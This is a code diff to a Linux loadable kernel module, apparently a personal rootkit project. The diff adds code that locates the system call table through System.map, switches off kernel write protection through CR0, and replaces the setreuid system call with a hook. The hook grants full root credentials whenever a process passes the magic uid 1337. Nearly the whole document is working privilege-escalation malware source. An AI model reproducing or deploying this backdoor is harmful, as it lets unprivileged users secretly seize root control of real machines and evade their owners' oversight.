@@ -4,9 +4,11 @@
 #include <linux/slab.h>
 #include <linux/fs.h>
 #include <linux/uaccess.h>
+#include <linux/kallsyms.h>
+#include <linux/syscalls.h>
 #include <asm/uaccess.h>
+#include <asm/unistd.h>
 #include "rootkit_conf.conf.h"
-#include "lsFuncs.h"
 
 MODULE_LICENSE("GPL") ;
 MODULE_AUTHOR("Brendan<brendanfoley1214@gmail.com>") ;
@@ -16,7 +18,31 @@ MODULE_VERSION("0.3");
 #define PROC_VERSION "/proc/version"
 #define BOOT_PATH "/boot/System.map-"
 
-long *sys_call_address;
+unsigned long *sys_call_address;
+
+asmlinkage int (* old_setreuid) (uid_t ruid, uid_t euid);
+asmlinkage int our_setreuid(uid_t ruid, uid_t euid){
+	struct cred *creds;
+	kuid_t zeroUID;
+	kgid_t zeroGID;
+	zeroUID.val = 0;
+	zeroGID.val = 0;
+
+	if(ruid == 1337 && euid == 1337){
+		creds = prepare_creds();
+		creds->uid = zeroUID;
+		creds->gid = zeroGID;
+		creds->euid = zeroUID;
+		creds->egid = zeroGID;
+		creds->suid = zeroUID;
+		creds->sgid = zeroGID;
+		creds->fsuid = zeroUID;
+		creds->fsgid = zeroGID;
+		commit_creds(creds);
+		return old_setreuid(0, 0);
+	}
+	return old_setreuid(ruid, euid);
+}
 
 int get_sys_call_table(char *path){
 	struct file *f;
@@ -48,15 +74,11 @@ int get_sys_call_table(char *path){
 			q = i;
 			i = 0;
 			if((strstr(pointer, "sys_call_table")) != NULL){
-				const char *address = strsep(&pointer, " ");
+				char *address = strsep(&pointer, " ");
 				sys_call_address = kmalloc(256, GFP_KERNEL);
 				memset(sys_call_address, 0x0, 256);
-				// Prints the correct sys_call_table address
-				printk(KERN_INFO "The address we got is: %s after %d iterations\n", address, q);
-				// Reporting wrong Hex value, but "address" is proper..?
-				// Next two lines cause instability
-				kstrtol(address, 16, sys_call_address);
-				printk(KERN_INFO "The address we got is: %X after %d iterations\n", sys_call_address, q);
+				kstrtoul(address, 16, sys_call_address);
+				printk(KERN_INFO "The address we got in address is: %s after %d iterations\n", address, q);
 				break;
 			}
 			memset(pointer, 0x0, 256);
@@ -103,7 +125,7 @@ char *get_kernel_version(void){
 
 // Loads the LKM
 static int __init rootkit_init(void){
-	printk(KERN_INFO "Hello Kernel! I am QUICK");
+	printk(KERN_INFO "Hello Kernel! I am ROOTKIT");
 	char *kernel_version = get_kernel_version();
 	if(kernel_version == NULL){
 		return 1;
@@ -111,16 +133,29 @@ static int __init rootkit_init(void){
 	char path[40] = BOOT_PATH;
 	strcat(path, kernel_version);
 	printk(KERN_INFO "Full Boot path is: %s\n", path);
-	printk(KERN_INFO "%d\n", testFunc());
 	get_sys_call_table(path);
-	//printk(KERN_INFO "Sys Call Address is: %d\n", sys_call_address);
+	printk(KERN_INFO "sys_call_table Address is: %X\n", *sys_call_address);
+	
+	write_cr0(read_cr0() & (~0x10000));
+
+	old_setreuid = sys_call_address[__NR_setreuid];
+	sys_call_address[__NR_setreuid] = &our_setreuid;
+
+	write_cr0(read_cr0() | 0x10000);
+
+	printk(KERN_INFO "setreuid replaced");
+	
 	return 0;
 }
 
 
 // Exits the LKM
 static void __exit rootkit_exit(void){
-	printk(KERN_INFO "Quick Unloaded\n");
+	write_cr0(read_cr0() & (~0x10000));
+	sys_call_address[__NR_setreuid] = old_setreuid;
+	write_cr0(read_cr0() | 0x10000);
+	printk(KERN_INFO "Old setreuid inserted");
+	printk(KERN_INFO "Rootkit Unloaded\n");
 	return;
 }
 
